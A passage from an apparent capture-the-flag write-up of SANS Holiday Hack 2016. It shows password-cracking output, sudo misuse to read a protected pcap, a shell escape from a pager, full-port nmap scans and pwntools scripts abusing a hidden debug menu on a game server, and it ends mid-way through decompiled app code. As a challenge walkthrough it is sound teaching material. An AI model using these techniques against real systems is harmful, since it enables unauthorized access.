341.5p/s 341.5c/s 341.5C/s zach01..tracyb\n0g 0:00:20:44 2% 0g/s 346.7p/s 346.7c/s 346.7C/s bernado..benfica2\n0g 0:00:20:46 2% 0g/s 346.7p/s 346.7c/s 346.7C/s bangbang3..balogh\nyummycookies     (cranpi)\n1g 0:00:21:50 100% 0.000762g/s 346.7p/s 346.7c/s 346.7C/s yves69..yukata\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n</code></pre> \n</figure> \n<p>After patiently waiting for a few minutes, we have our cracked password and the answer to question 5.</p> \n<h3 id=\"5-what-is-the-password-for-the-cranpi-account-on-the-cranberry-pi-system\">5) What is the password for the “cranpi” account on the Cranberry Pi system?</h3> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>yummycookies\n</code></pre> \n </div> \n</div> \n<p>Now that we have our password to the Cranberry Pi, let’s go through each of the terminals in game.</p> \n<h3 id=\"61-how-did-you-open-each-terminal-door\">6.1) How did you open each terminal door…</h3> \n<p>The next series of questions were from terminals within the game itself.</p> \n<h5 id=\"elf-house-2---to-open-the-door-find-both-parts-of-the-passphrase-inside-the-outpcap-file\">Elf House #2 - To open the door, find both parts of the passphrase inside the /out.pcap file</h5> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>scratchy@c8089dc3a829:/$ whoami\nscratchy\nscratchy@c8089dc3a829:/$ ls -la /out.pcap\n-r-------- 1 itchy itchy 1087928 Dec  2 15:05 /out.pcap\n</code></pre> \n </div> \n</div> \n<p>Looks like we are the <code class=\"highlighter-rouge\">scratchy</code> user but <code class=\"highlighter-rouge\">/out.pcap</code> is owned by <code class=\"highlighter-rouge\">itchy</code>. One method of running other commands as another user is via the <code class=\"highlighter-rouge\">sudo</code> command. Let’s look at what we can possibly run as <code class=\"highlighter-rouge\">itchy</code> using <code class=\"highlighter-rouge\">sudo</code>.</p> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>scratchy@dfb2060be020:/$ sudo -l        \nsudo: unable to resolve host dfb2060be020\nMatching Defaults entries for scratchy on dfb2060be020:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n    User scratchy may run the following commands on dfb2060be020:\n    (itchy) NOPASSWD: /usr/sbin/tcpdump\n    (itchy) NOPASSWD: /usr/bin/strings\n</code></pre> \n </div> \n</div> \n<p>Now we can simply run <code class=\"highlighter-rouge\">strings</code> or <code class=\"highlighter-rouge\">tcpdump</code> as <code class=\"highlighter-rouge\">itchy</code> against the <code class=\"highlighter-rouge\">/out.pcap</code>.</p> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>scratchy@61a080518c85:/$ sudo -u itchy strings out.pcap \n<span class=\"nt\">&lt;html&gt;</span>\n<span class=\"nt\">&lt;head&gt;&lt;/head&gt;</span>\n<span class=\"nt\">&lt;body&gt;</span>\n<span class=\"nt\">&lt;form&gt;</span>\n<span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">\"hidden\"</span> <span class=\"na\">name=</span><span class=\"s\">\"part1\"</span> <span class=\"na\">value=</span><span class=\"s\">\"santasli\"</span> <span class=\"nt\">/&gt;</span>\n<span class=\"nt\">&lt;/form&gt;</span>\n<span class=\"nt\">&lt;/body&gt;</span>\n<span class=\"nt\">&lt;/html&gt;</span>\n</code></pre> \n </div> \n</div> \n<p>Boom! Part 1 is <code class=\"highlighter-rouge\">santasli</code>. The second part is a bit trickier. We can try to change the encoding schemes used by strings to extract part2. Here we are wanting to extract strings of 16-bit little endian.</p> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>scratchy@fd947cbbfb0c:/$ sudo -u itchy strings -e l out.pcap              \nsudo: unable to resolve host fd947cbbfb0c\npart2:ttlehelper\n</code></pre> \n </div> \n</div> \n<p>Combining the two parts gives us the key to the door:</p> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>santaslittlehelper\n</code></pre> \n </div> \n</div> \n<h5 id=\"workshop-1---to-open-the-door-find-the-passphrase-file-deep-in-the-directories\">Workshop #1 - To open the door, find the passphrase file deep in the directories.</h5> \n<p>We have to find a passphrase. Again, utilizing <code class=\"highlighter-rouge\">find</code> is a great way to discover such files.</p> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>elf@ef46088d503b:~$ find .\n.\n./.bashrc\n./.doormat\n./.doormat/. \n./.doormat/. / \n./.doormat/. / /\\\n./.doormat/. / /\\/\\\\\n./.doormat/. / /\\/\\\\/Don't Look Here!\n./.doormat/. / /\\/\\\\/Don't Look Here!/You are persistent, aren't you?\n./.doormat/. / /\\/\\\\/Don't Look Here!/You are persistent, aren't you?/'\n./.doormat/. / /\\/\\\\/Don't Look Here!/You are persistent, aren't you?/'/key_for_the_door.txt\n./.doormat/. / /\\/\\\\/Don't Look Here!/You are persistent, aren't you?/cookbook\n./.doormat/. / /\\/\\\\/Don't Look Here!/You are persistent, aren't you?/temp\n./.doormat/. / /\\/\\\\/Don't Look Here!/secret\n./.doormat/. / /\\/\\\\/Don't Look Here!/files\n./.doormat/. / /\\/\\\\/holiday\n./.doormat/. / /\\/\\\\/temp\n./.doormat/. / /\\/santa\n./.doormat/. / /\\/ls\n./.doormat/. / /opt\n./.doormat/. / /var\n./.doormat/. /bin\n./.doormat/. /not_here\n./.doormat/share\n./.doormat/temp\n./var\n./temp\n./.profile\n./.bash_logout\n</code></pre> \n </div> \n</div> \n<p>Looks like <code class=\"highlighter-rouge\">key_for_the_door.txt</code> is the file we want to grab. So the challenge here is to traverse the weird directory structure given. Below is one possible solution to retrieving the key file.</p> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>elf@9e5b15c1546f:~$ cd .doormat\nelf@9e5b15c1546f:~/.doormat$ cd \". \"\nelf@9e5b15c1546f:~/.doormat/. $ cd \\ \nelf@9e5b15c1546f:~/.doormat/. / $ cd \\\\\nelf@9e5b15c1546f:~/.doormat/. / /\\$ cd \\\\\\\\\nelf@9e5b15c1546f:~/.doormat/. / /\\/\\\\$ cd D*\nelf@9e5b15c1546f:~/.doormat/. / /\\/\\\\/Don't Look Here!$ cd Y*\nelf@9e5b15c1546f:~/.doormat/. / /\\/\\\\/Don't Look Here!/You are persistent, aren't you?\n$ cd \\'\nelf@9e5b15c1546f:~/.doormat/. / /\\/\\\\/Don't Look Here!/You are persistent, aren't you?\n/'$ cat key* \nkey: open_sesame\n</code></pre> \n </div> \n</div> \n<h5 id=\"santas-office---greetings-professor-falken\">Santa’s Office - GREETINGS PROFESSOR FALKEN.</h5> \n<p>We see the phrase “GREETINGS PROFESSOR FALKEN”. This is a reference to the movie <a href=\"http://www.imdb.com/title/tt0086567/\">Wargames</a>.</p> \n<p><em>Side note: If you are reading this or playing the HolidayHack and haven’t seen this movie, you simply have to stop reading and watch the movie before proceeding. That is all.</em></p> \n<p>We have to replicate the Wargames interaction in order to be given the passphrase. We can follow <a href=\"https://github.com/abs0/wargames/blob/master/wargames.sh\">this script</a> to help through the terminal prompts.</p> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>GREETINGS PROFESSOR FALKEN.\nHello.\n\nHOW ARE YOU FEELING TODAY?\nI'm fine. How are you?\n\nEXCELLENT,g IT'S BEEN A LONG TIME. CAN YOU EXPLAIN THE REMOVAL OF YOUR USER ACCOUNT ON 6/23/73?\nPeople sometimes make mistakes.\n\nYES THEY DO. SHALL WE PLAY A GAME?\nLove to. How about Global Thermonuclear War?\n\nWOULDN'T YOU PREFER A GOOD GAME OF CHESS?\nLater. Let's play Global Thermonuclear War.\n\n ,------~~v,_         _                     _--^\\\n |'          \\   ,__/ ||                 _/    /,_ _\n/             \\,/     /         ,,  _,,/^         v v-___\n|                    /          |'~^                     \\\n\\                   |         _/                     _ _/^\n \\                 /         /                   ,~~^/ | \n  ^~~_       _ _   /          |          __,, _v__\\   \\/\n      '~~,  , ~ \\ \\           ^~       /    ~   //\n          \\/     \\/             \\~,  ,/          \n                                   ~~\n   UNITED STATES                   SOVIET UNION\nWHICH SIDE DO YOU WANT?\n     1.    UNITED STATES\n     2.    SOVIET UNION\nPLEASE CHOOSE ONE: \n2\n\nAWAITING FIRST STRIKE COMMAND\n-----------------------------\nPLEASE LIST PRIMARY TARGETS BY\nCITY AND/OR COUNTRY NAME: \nLas Vegas\n\nLAUNCH INITIATED, HERE'S THE KEY FOR YOUR TROUBLE: \n\nLOOK AT THE PRETTY LIGHTS\nPress Enter To Continue\n</code></pre> \n </div> \n</div> \n<p>And there we have the passphrase for this terminal: <code class=\"highlighter-rouge\">LOOK AT THE PRETTY LIGHTS</code></p> \n<h5 id=\"workshop-2---find-the-passphrase-from-the-wumpus--play-fair-or-cheat-its-up-to-you\">Workshop #2 - Find the passphrase from the wumpus. Play fair or cheat; it’s up to you.</h5> \n<p>We are presented a game where we are in a room and can traverse to other rooms via a <code class=\"highlighter-rouge\">move</code> command. During our adventure, we have to kill the evil Wumpus via a <code class=\"highlighter-rouge\">shoot</code> command. While moving, we are given a warning via <code class=\"highlighter-rouge\">*sniff* (I can smell the evil Wumpus nearby!)</code>. When this message occurs, we can shoot the adjacent rooms and we should hit the Wumpus.</p> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>You are in room 7 of the cave, and have 5 arrows left.\n*whoosh* (I feel a draft from some pits).\n*sniff* (I can smell the evil Wumpus nearby!)\nThere are tunnels to rooms 3, 16, and 18.\nMove or shoot? (m-s) s 3\n\nYou are in room 7 of the cave, and have 4 arrows left.\n*whoosh* (I feel a draft from some pits).\n*sniff* (I can smell the evil Wumpus nearby!)\nThere are tunnels to rooms 3, 16, and 18.\nMove or shoot? (m-s) s 16\n\n*thwock!* *groan* *crash*\nA horrible roar fills the cave, and you realize, with a smile, that you\nhave slain the evil Wumpus and won the game!  You don't want to tarry for\nlong, however, because not only is the Wumpus famous, but the stench of\ndead Wumpus is also quite well known, a stench plenty enough to slay the\nmightiest adventurer at a single whiff!!\n\nPassphrase:\nWUMPUS IS MISUNDERSTOOD\n</code></pre> \n </div> \n</div> \n<p>This terminal gives us access to the DFER.</p> \n<h5 id=\"workshop--train-station---train-management-console\">Workshop – Train Station - Train Management Console</h5> \n<p>We are presented with the Train Management Console.</p> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>==== MAIN MENU ====\nSTATUS:                         Train Status\nBRAKEON:                        Set Brakes\nBRAKEOFF:                       Release Brakes\nSTART:                          Start Train\nHELP:                           Open the help document\nQUIT:                           Exit console\n</code></pre> \n </div> \n</div> \n<p>In order to <code class=\"highlighter-rouge\">START</code> the train, the brakes must be off AND we have to have the management password.</p> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>menu:main&gt; START\nChecking brakes....\nEnter Password: \n</code></pre> \n </div> \n</div> \n<p>Looking at the <code class=\"highlighter-rouge\">HELP</code>, we immediately see the filename of a file being shown. This probably means this screen is being displayed via <code class=\"highlighter-rouge\">less</code> or <code class=\"highlighter-rouge\">more</code>. If that is the case, we can use the command feature of <code class=\"highlighter-rouge\">less</code> or <code class=\"highlighter-rouge\">more</code> to execute a command via <code class=\"highlighter-rouge\">!</code>. Let’s give it a try.</p> \n<p><img src=\"http://ctfhacker.com/assets/images/holidayhack2016/train.gif\" alt=\"train.gif\" /></p> \n<p>Now that we can execute commands, let’s see what is in all the files in the directory.</p> \n<p><img src=\"http://ctfhacker.com/assets/images/holidayhack2016/train2.gif\" alt=\"train2.gif\" /></p> \n<p>We now have the password for the train (<code class=\"highlighter-rouge\">24fb3e89ce2aa0ea422c3d511d40dd84</code>) and can start it.</p> \n<p><img src=\"http://ctfhacker.com/assets/images/holidayhack2016/train3.gif\" alt=\"train3.gif\" /></p> \n<h3 id=\"62-and-where-had-the-villain-imprisoned-santa\">6.2) …and where had the villain imprisoned Santa?</h3> \n<p>After going through the time traveling train, we are sent to the year 1976. Looks like Santa was imprisioned in the DFER in 1976.</p> \n<p><img src=\"http://ctfhacker.com/assets/images/holidayhack2016/santa.png\" alt=\"santa.png\" /></p> \n<h1 id=\"part-4-my-gosh-its-full-of-holes\">Part 4: My Gosh… It’s Full of Holes</h1> \n<p>Hurray, we found Santa. Now we get to participate in Santa’s bug bounty program. Here we target the various servers that are related to SantaGram in order to try to retrieve the various audio files. Strap in.. here we go!</p> \n<p>We can find the hostnames of the servers by a simple search in our <code class=\"highlighter-rouge\">apktool</code> output directory.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"><span class=\"n\">ctfhacker</span> at <span class=\"mi\">barberpole</span> in <span class=\"k\">~/SantaGram_4.2</span> on <span class=\"kc\">master</span>\n$ ag \\.north\n\nSantaGram_4.2/res/values/strings.xml\n\n   \n   <string name=\"analytics_launch_url\">\n    \n    https://analytics.northpolewonderland.com/report.php?type=launch\n   \n   </string>\n\n   \n   <string name=\"analytics_usage_url\">\n    \n    https://analytics.northpolewonderland.com/report.php?type=usage\n   \n   </string>\n\n   \n   <string name=\"banner_ad_url\">\n    \n    http://ads.northpolewonderland.com/affiliate/C9E380C8-2244-41E3-93A3-D6C6700156A5\n   \n   </string>\n\n   \n   <string name=\"debug_data_collection_url\">\n    \n    http://dev.northpolewonderland.com/index.php\n   \n   </string>\n\n   \n   <string name=\"dungeon_url\">\n    \n    http://dungeon.northpolewonderland.com/\n   \n   </string>\n\n   \n   <string name=\"exhandler_url\">\n    \n    http://ex.northpolewonderland.com/exception.php\n   \n   </string>\n</code></pre> \n</figure> \n<p>We want to make sure we know what ports are open on which hosts. Let’s write a quick for loop to run <code class=\"highlighter-rouge\">nmap</code> over all ports on every host.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"><span class=\"n\">root</span> at <span class=\"mi\">epictreasure</span> in <span class=\"k\">~/host-share/holidayhack2016</span> on <span class=\"kc\">master</span>*\n$ cat target_boxes \nanalytics.northpolewonderland.com\nads.northpolewonderland.com\ndev.northpolewonderland.com\ndungeon.northpolewonderland.com\nex.northpolewonderland.com\n\n<span class=\"n\">root</span> at <span class=\"mi\">epictreasure</span> in <span class=\"k\">~/host-share/holidayhack2016</span> on <span class=\"kc\">master</span>*\n$ for t in $(cat target_boxes); do nmap -p- -oA $t $t; done\n</code></pre> \n</figure> \n<p>Quick nmap options:</p> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>* -p-    - Scan for all ports\n* -oA $t - Save all output formats with prefix of the host\n* $t     - The host to run nmap on \n</code></pre> \n </div> \n</div> \n<h3 id=\"71-the-mobile-analytics-server-via-credentialed-login-access\">7.1) The Mobile Analytics Server (via credentialed login access)</h3> \n<p>After logging into the application via the credentials found in the APK (<code class=\"highlighter-rouge\">guest / busyreindeer78</code>), there is an MP3 button that immediately downloads an audio file:</p> \n<p><img src=\"http://ctfhacker.com/assets/images/holidayhack2016/analytics.png\" alt=\"analytics.png\" /></p> \n<p>We are presented with our next needed audio file.</p> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>discombobulatedaudio2.mp2\n</code></pre> \n </div> \n</div> \n<h3 id=\"72-the-dungeon-game\">7.2) The Dungeon Game</h3> \n<p>Ports relevant for the Dungeon Game:</p> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>PORT      STATE    SERVICE\n22/tcp    open     ssh\n80/tcp    open     http\n11111/tcp open     vce\n</code></pre> \n </div> \n</div> \n<p>Port 80 shows some basic rules and commands to use while playing the text-based dungeon crawler. Our goal is to reach the lair of a michievous Elf who can trade us secrets that could help our quest.</p> \n<p>We are also given the dungeon game binary through one of the characters in game. While we’re sure the dungeon game itself is fun and the story is quite intriguing, since we have the binary, hacking that seems more interesting ;-) Let’s take a look at how we can cheat at the game to achieve the goal.</p> \n<p>After verifying the server is indeed on port 11111 via <code class=\"highlighter-rouge\">nc dungeon.northpolewonderland.com 11111</code>, we need a client to communicate with the dungeon server. This sounds like a perfect place to use <a href=\"https://github.com/Gallopsled/pwntools\">pwntools</a>. <code class=\"highlighter-rouge\">pwntools</code> will give us an easy API for communicating with the server.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-python\" data-lang=\"python\"><span class=\"kn\">from</span> <span class=\"nn\">pwn</span> <span class=\"kn\">import</span> <span class=\"o\">*</span>\n<span class=\"n\">r</span> <span class=\"o\">=</span> <span class=\"n\">remote</span><span class=\"p\">(</span><span class=\"s\">'dungeon.northpolewonderland.com'</span><span class=\"p\">,</span> <span class=\"mi\">11111</span><span class=\"p\">)</span>\n<span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">interactive</span><span class=\"p\">()</span></code></pre> \n</figure> \n<p>Now that we have a client, let’s see what we can discover about the binary iteself. Something that is immediately intruging is a particular path at the beginning of <code class=\"highlighter-rouge\">main</code> that performs a <code class=\"highlighter-rouge\">strcmp</code> against the string <code class=\"highlighter-rouge\">GDT</code> (at address <code class=\"highlighter-rouge\">0x419a34</code>). Let’s look at this path in <a href=\"http://binary.ninja\">Binary Ninja</a>.</p> \n<p><img src=\"http://ctfhacker.com/assets/images/holidayhack2016/dungeon1.gif\" alt=\"dungeon1.gif\" /></p> \n<p>Let’s see if this <code class=\"highlighter-rouge\">GDT</code> command does anything special in the game.</p> \n<script type=\"text/javascript\" src=\"https://asciinema.org/a/0rmdrce8wu4n5h66lewif3dok.js\" id=\"asciicast-0rmdrce8wu4n5h66lewif3dok\" async=\"\"></script> \n<p>Ok, we have found a menu that has various actions as <code class=\"highlighter-rouge\">Alter X</code>, <code class=\"highlighter-rouge\">Display X</code>, and <code class=\"highlighter-rouge\">Take</code>. Let’s see if the <code class=\"highlighter-rouge\">Take</code> command actually does anything for us.</p> \n<script type=\"text/javascript\" src=\"https://asciinema.org/a/488twgxv931dlnr90nn3bj6dr.js\" id=\"asciicast-488twgxv931dlnr90nn3bj6dr\" async=\"\"></script> \n<p>Now we have the ability to give ourselves whatever item we want. Let’s add this functionality to our client to get the first 20 items.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-python\" data-lang=\"python\"><span class=\"kn\">from</span> <span class=\"nn\">pwn</span> <span class=\"kn\">import</span> <span class=\"o\">*</span>\n\n<span class=\"n\">r</span> <span class=\"o\">=</span> <span class=\"n\">remote</span><span class=\"p\">(</span><span class=\"s\">'dungeon.northpolewonderland.com'</span><span class=\"p\">,</span> <span class=\"mi\">11111</span><span class=\"p\">)</span>\n<span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">sendline</span><span class=\"p\">(</span><span class=\"s\">'GDT'</span><span class=\"p\">)</span> <span class=\"c\"># Enter Debug menu</span>\n<span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">recvuntil</span><span class=\"p\">(</span><span class=\"s\">'GDT&gt;'</span><span class=\"p\">)</span> <span class=\"c\"># Recv until we read the next prompt</span>\n<span class=\"k\">for</span> <span class=\"n\">x</span> <span class=\"ow\">in</span> <span class=\"nb\">xrange</span><span class=\"p\">(</span><span class=\"mi\">20</span><span class=\"p\">):</span>\n    <span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">sendline</span><span class=\"p\">(</span><span class=\"s\">'TK'</span><span class=\"p\">)</span> <span class=\"c\"># Call Take action</span>\n    <span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">sendline</span><span class=\"p\">(</span><span class=\"nb\">str</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">))</span>\n    <span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">recvuntil</span><span class=\"p\">(</span><span class=\"s\">'GDT&gt;'</span><span class=\"p\">)</span>\n\n<span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">sendline</span><span class=\"p\">(</span><span class=\"s\">\"EX\"</span><span class=\"p\">)</span> <span class=\"c\"># Exit Debug menu</span>\n<span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">sendline</span><span class=\"p\">(</span><span class=\"s\">\"I\"</span><span class=\"p\">)</span> <span class=\"c\"># Print all items to see what we have retrieved</span>\n<span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">interactive</span><span class=\"p\">()</span></code></pre> \n</figure> \n<p>And testing the script..</p> \n<script type=\"text/javascript\" src=\"https://asciinema.org/a/buaz9peiu92wkgqycnb3xzus1.js\" id=\"asciicast-buaz9peiu92wkgqycnb3xzus1\" async=\"\"></script> \n<p>Now we could increase <code class=\"highlighter-rouge\">20</code> to <code class=\"highlighter-rouge\">200</code> or <code class=\"highlighter-rouge\">300</code> in order to fill our inventory with all possible items in the game. There was another interesting field in the debug menu called <code class=\"highlighter-rouge\">Alter Here</code>. Let’s experiment a bit with this functionality.</p> \n<script type=\"text/javascript\" src=\"https://asciinema.org/a/7cc859yvj29l5wyjxxtq1dyyt.js\" id=\"asciicast-7cc859yvj29l5wyjxxtq1dyyt\" async=\"\"></script> \n<p>Now that we know we can move between rooms based on number, let’s mimic our items script with a room script to see the description for each of the rooms available in the dungeon.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-python\" data-lang=\"python\"><span class=\"kn\">from</span> <span class=\"nn\">pwn</span> <span class=\"kn\">import</span> <span class=\"o\">*</span>\n\n<span class=\"n\">r</span> <span class=\"o\">=</span> <span class=\"n\">remote</span><span class=\"p\">(</span><span class=\"s\">'dungeon.northpolewonderland.com'</span><span class=\"p\">,</span> <span class=\"mi\">11111</span><span class=\"p\">)</span>\n<span class=\"k\">for</span> <span class=\"n\">x</span> <span class=\"ow\">in</span> <span class=\"nb\">xrange</span><span class=\"p\">(</span><span class=\"mi\">250</span><span class=\"p\">):</span>\n    <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">)</span>\n    <span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">sendline</span><span class=\"p\">(</span><span class=\"s\">'GDT'</span><span class=\"p\">)</span> <span class=\"c\"># Enter Debug menu</span>\n    <span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">recvuntil</span><span class=\"p\">(</span><span class=\"s\">'GDT&gt;'</span><span class=\"p\">)</span>\n    <span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">sendline</span><span class=\"p\">(</span><span class=\"s\">\"AH\"</span><span class=\"p\">)</span> <span class=\"c\"># Alter Here action</span>\n    <span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">sendline</span><span class=\"p\">(</span><span class=\"nb\">str</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">))</span>\n    <span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">recvuntil</span><span class=\"p\">(</span><span class=\"s\">'GDT&gt;'</span><span class=\"p\">)</span>\n    <span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">sendline</span><span class=\"p\">(</span><span class=\"s\">'EX'</span><span class=\"p\">)</span> <span class=\"c\"># Exit Debug menu</span>\n    <span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">sendline</span><span class=\"p\">(</span><span class=\"s\">'L'</span><span class=\"p\">)</span> <span class=\"c\"># Display current location description</span>\n    <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">recvuntil</span><span class=\"p\">(</span><span class=\"s\">'&gt;'</span><span class=\"p\">))</span>\n    <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">recvuntil</span><span class=\"p\">(</span><span class=\"s\">'&gt;'</span><span class=\"p\">))</span></code></pre> \n</figure> \n<p>This script will start spitting out descriptions of all rooms. After running the script, we notice that room 192 has some very interesting text about an Elf:</p> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>&gt;$ l\nYou have mysteriously reached the North Pole. \nIn the distance you detect the busy sounds of Santa's elves in full \nproduction. \n\nYou are in a warm room, lit by both the fireplace but also the glow of \ncenturies old trophies.\nOn the wall is a sign: \n    Songs of the seasons are in many parts \n    To solve a puzzle is in our hearts\n    Ask not what what the answer be,\n    Without a trinket to satisfy me.\nThe elf is facing you keeping his back warmed by the fire.\n</code></pre> \n </div> \n</div> \n<p>This sounds like we have to give the Elf some kind of fancy item in order to satisfy it. In order to achieve this, we can modify our first items script to jump to room 192 afterwards. We can then examine our inventory and try to give the elf something fancy.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-python\" data-lang=\"python\"><span class=\"kn\">from</span> <span class=\"nn\">pwn</span> <span class=\"kn\">import</span> <span class=\"o\">*</span>\n\n<span class=\"n\">r</span> <span class=\"o\">=</span> <span class=\"n\">remote</span><span class=\"p\">(</span><span class=\"s\">'dungeon.northpolewonderland.com'</span><span class=\"p\">,</span> <span class=\"mi\">11111</span><span class=\"p\">)</span>\n<span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">sendline</span><span class=\"p\">(</span><span class=\"s\">'GDT'</span><span class=\"p\">)</span> <span class=\"c\"># Enter Debug menu</span>\n<span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">recvuntil</span><span class=\"p\">(</span><span class=\"s\">'GDT&gt;'</span><span class=\"p\">)</span>\n<span class=\"k\">for</span> <span class=\"n\">x</span> <span class=\"ow\">in</span> <span class=\"nb\">xrange</span><span class=\"p\">(</span><span class=\"mi\">20</span><span class=\"p\">):</span>\n    <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">)</span>\n    <span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">sendline</span><span class=\"p\">(</span><span class=\"s\">'TK'</span><span class=\"p\">)</span> <span class=\"c\"># Take action</span>\n    <span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">sendline</span><span class=\"p\">(</span><span class=\"nb\">str</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">))</span>\n    <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">recvuntil</span><span class=\"p\">(</span><span class=\"s\">'GDT&gt;'</span><span class=\"p\">))</span>\n\n<span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">sendline</span><span class=\"p\">(</span><span class=\"s\">\"AH\"</span><span class=\"p\">)</span> <span class=\"c\"># Alter Here action</span>\n<span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">sendline</span><span class=\"p\">(</span><span class=\"s\">\"192\"</span><span class=\"p\">)</span> <span class=\"c\"># Enter room 192</span>\n<span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">sendline</span><span class=\"p\">(</span><span class=\"s\">\"EX\"</span><span class=\"p\">)</span> <span class=\"c\"># Exit Debug Menu</span>\n<span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">sendline</span><span class=\"p\">(</span><span class=\"s\">\"I\"</span><span class=\"p\">)</span> <span class=\"c\"># Look at our inventory</span>\n<span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">interactive</span><span class=\"p\">()</span></code></pre> \n</figure> \n<script type=\"text/javascript\" src=\"https://asciinema.org/a/2l8ypm7rvwo7i7w29au65k97r.js\" id=\"asciicast-2l8ypm7rvwo7i7w29au65k97r\" async=\"\"></script> \n<p>It looks like that worked! After emailing <code class=\"highlighter-rouge\">peppermint@northpolewonderland.com</code>, we receive our much deserved audio file.</p> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>You tracked me down, of that I have no doubt.\nI won't get upset, to avoid the inevitable bout.\nYou have what you came for, attached to this note.\nNow go and catch your villian, and we will alike do dote.\n</code></pre> \n </div> \n</div> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>discombobulatedaudio3.mp3\n</code></pre> \n </div> \n</div> \n<h3 id=\"73-the-debug-server\">7.3) The Debug Server</h3> \n<p>Ports relevant for the Debug Server (<code class=\"highlighter-rouge\">dev.northpolewonderland.com</code>):</p> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>PORT      STATE    SERVICE\n80/tcp    open     http\n</code></pre> \n </div> \n</div> \n<p>Let’s see where this server is used in our APK.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"><span class=\"n\">ctfhacker</span> at <span class=\"mi\">barberpole</span> in <span class=\"k\">~/SantaGram_4.2_source_from_JADX</span> on <span class=\"kc\">master</span>\n$ ag dev.north\n\nres/values/strings.xml\n32: \n   \n   <string name=\"debug_data_collection_url\">\n    \n    http://dev.northpolewonderland.com/index.php\n   \n   </string>\n\ncom/northpolewonderland/santagram/EditProfile.java\n49: C0987b.m4776a(this.f2409b.getString(2131165213), this.f2408a); // dev.northpolewonderland.com\n</code></pre> \n</figure> \n<p>Looks like the only location of this host is found in <code class=\"highlighter-rouge\">EditProfile</code>. Let’s get a bit more context to how this string is used.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"><span class=\"cm\">/* renamed from: com.northpolewonderland.santagram.EditProfile.1 */</span>\n<span class=\"kd\">class</span> <span class=\"nc\">C08591</span> <span class=\"kd\">implements</span> <span class=\"n\">Runnable</span> <span class=\"o\">{</span>\n\t<span class=\"kd\">final</span> <span class=\"cm\">/* 